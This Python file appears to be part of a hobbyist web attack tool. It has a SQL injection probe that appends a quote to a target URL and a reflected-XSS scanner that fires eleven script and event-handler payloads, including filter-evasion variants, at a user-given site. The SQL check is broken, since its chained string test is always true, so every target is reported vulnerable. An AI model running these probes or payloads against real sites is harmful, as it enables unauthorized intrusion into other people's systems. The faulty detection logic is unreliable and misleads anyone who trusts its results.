import requests
import re
from mods import a_main

def sqliscan():
    try:
        print('  SQLI Scan')
        print("  example: http://example/listproducts.php?cat=1")
        url = input('  [\033[1;31murl\033[0;0m]> > ')
    except:
        print('  [\033[1;31m!\033[0;0m]- Something was wrong.')
        input('press enter')
        sqliscan()
   

    urli = url.split("=")
    urlii = urli[0] + "="
    inject = urlii + "'"
    header = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebkit/537.36 (KHTML, like Gecko) '
                            'Chome/51.0.2704.103 Safai/537.36' }


    req = requests.get(inject, headers=header)

    html = req.text

    print('  ',req.url)

    if 'mysql_fetch_array()'or 'You have an error in your SQL syntax' or 'error in your SQL syntax'\
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error'\
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in html:

        print ('   [\033[1;32mOK\033[0;0m]- An error in the SQL syntax was found.'
               '   The target looks vulnerable!')
    else:
        print ('[!]- No error found.')

    input('press enter')
    a_main.a_main()

def xssscan():
    def lin():
        print('\033[1;32m>--------------------------------------------------------------------------------------\033[0;0m')

    cou = 0
    payl = ["<script>alert('axex')</script>", "><script>alert('axex')</script>", \
            "<scr<script>ipt>alert(/axex/)</scr</script>ipt>", "%253script%253ealert(/axex/)%253c/script%253e", \
            ">head<script>alert('axex')</script>head>", "<IMG onmouseover=\"alert('axex')\">",
            "</script><script>alert('axex');</script>", \
            "Axex</script><script>alert(axex)</script>Axex", "<h1>Axex</h1>", "<svg/onload=alert(axex)>//INJECTX", \
            "<iframe/onload=alert(/INJECTX/)>"]
    try:
        print('  XSS Reflected Url Exploitable')
        print("  example: http://example/listproducts.php?cat=")
        url = input('  [\033[1;31murl\033[0;0m]> ')
        print("\n")
        print("\033[1;32m|\033[0;0mXss Payloads:", len(payl), " Tartg:", url)
        lin()

        for pay in payl:
            cou = cou + 1
            print("\033[1;32m+\033[0;0mXSS Payload:", cou, " ", pay)
            print("\033[1;32m|\033[0;0mTarget:", url)
            try:
                html = requests.get(url + pay)
                chek = html.text
                if pay in chek:
                    print("\033[1;32m+---------Found\033[0;0m")
                else:
                    print("\033[1;31m+---------Not Found\033[0;0m")
            except:
                print("erro")
            lin()

    except:
        print('  [\033[1;31m!\033[0;0m]- Something was wrong.')
        input('press enter')
        xssscan()

    input('press enter')
    a_main.a_main()
